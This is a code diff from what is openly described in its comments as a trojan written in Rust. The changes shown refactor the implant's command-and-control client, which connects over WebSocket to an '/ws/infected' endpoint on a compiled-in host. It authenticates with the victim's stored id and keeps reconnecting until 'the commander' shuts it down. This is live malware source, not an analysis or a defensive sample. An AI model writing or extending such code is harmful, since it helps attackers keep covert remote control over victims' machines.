@@ -16,18 +16,22 @@ use tokio_tungstenite::{
 };
 
 use crate::{
-    constants::compiled::{self, HTTP_COMMANDER_RECONNECT, WS_COMMANDER_RECONNECT, WS_URL},
-    storage::locked_store,
+    constants::compiled::{self, WS_COMMANDER_RECONNECT, WS_URL},
+    storage::STORAGE,
 };
 
 static RUNNING: LazyLock<Mutex<bool>> = LazyLock::new(|| Mutex::new(true));
 
 pub async fn start_ws_loop() -> Result<()> {
+
+    // Construct a request with the `iid` set for authentication
     let req = Request::builder()
         .uri(WS_URL("/ws/infected"))
         .header(
             "Authorization",
-            format!("Bearer {}", locked_store()?.iid.as_ref().unwrap()),
+            format!("Bearer {}", {
+                STORAGE.lock().unwrap().iid.clone().unwrap()
+            }),
         )
         .header("Host", compiled::HOST)
         .header("Connection", "Upgrade")
@@ -36,6 +40,8 @@ pub async fn start_ws_loop() -> Result<()> {
         .header("Sec-WebSocket-Key", generate_key())
         .body(())
         .unwrap();
+
+    // Loop as long as the commander didn't shut down the trojan
     while {
         let running = *RUNNING.lock().unwrap();
         running
@@ -43,6 +49,8 @@ pub async fn start_ws_loop() -> Result<()> {
         let mut ws: Option<_> = Option::None;
 
         let mut interval = interval(Duration::from_millis(WS_COMMANDER_RECONNECT));
+
+        // try reconnecting in the case of the connection being closed
         while ws.is_none() {
             match connect_async(req.clone()).await {
                 Ok(res) => ws = Some(res.0),
